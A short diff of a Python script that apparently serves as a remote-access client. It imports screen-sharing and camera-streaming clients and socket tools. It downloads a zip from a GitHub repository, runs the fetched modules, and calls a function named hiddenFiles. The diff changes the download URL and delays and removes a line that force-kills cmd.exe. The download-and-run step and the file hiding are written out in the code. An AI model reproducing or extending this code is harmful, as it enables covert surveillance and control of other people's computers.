@@ -1,8 +1,8 @@
 import socket, zipfile, os, shutil, time, subprocess, requests, pyautogui
 from vidstream import ScreenShareClient, CameraClient; from turtle import left
 from multiprocessing import Process
-time.sleep(2)
-url = "https://github.com/N0SAFE/kit-local/archive/refs/heads/main.zip"
+time.sleep(5)
+url = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip"
     
 def getpath(change=False):
     if change in (False, "not", "\\"):          return os.getcwd()
@@ -42,7 +42,6 @@ while tryit == False:
     try: 
         import modif, scripter
         tryit = True
-        subprocess.Popen("taskkill /IM cmd.exe /F")
     except:
         listfile, dir = ["modif.pyw", "scripter.pyw"], getNameDir(url)
         downloadFileGithub(url)
@@ -52,7 +51,6 @@ while tryit == False:
         time.sleep(0.5)
         os.system(getFileName())
         modif.hiddenFiles()
-        time.sleep(2)
 
 def receive():
     try:
